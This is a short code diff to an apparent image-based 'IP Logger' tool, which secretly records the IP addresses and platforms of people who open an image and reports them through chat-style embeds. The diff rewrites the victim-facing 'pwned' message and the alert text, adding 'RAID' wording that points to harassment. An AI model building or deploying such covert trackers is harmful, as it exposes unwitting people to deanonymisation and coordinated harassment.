@@ -27,7 +27,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by CUD IP Logger.", # Message to show
+        "message": "This browser has been pwned by CID IP Logger.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -98,9 +98,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "IP Logger - Text Sent",
+            "title": "RAID PLSS 🥵🥵",
             "color": config["color"],
-            "description": f"An **Text Logging** UN MENSAJE FUE ENVIADO EN CHAT!\nEs posible que recibas una IP pronto.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"An **Text Logging** QUIEREN SER RAID 🥵🥵.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
